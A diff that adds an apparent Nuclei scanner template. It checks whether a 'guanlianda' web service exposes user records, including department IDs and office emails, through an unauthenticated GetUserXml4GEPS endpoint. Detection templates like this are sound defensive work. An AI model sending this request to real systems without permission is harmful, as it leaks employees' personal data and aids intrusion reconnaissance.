@@ -1,0 +1,20 @@
+id: guanlianda-service-getuserxml-info
+
+info:
+  name: guanlianda-service-getuserxml-info
+  author: guanlianda-service-getuserxml-info
+
+http:
+  - raw:
+      - |
+        GET /Org/service/Service.asmx/GetUserXml4GEPS  HTTP/1.1
+        Host: {{Hostname}}
+        Range: bytes=0-5000
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"USR_DEP_ID") && contains(body,"USR_OFFICE_EMAIL") && contains(body,"USR_PLATFORMID")'
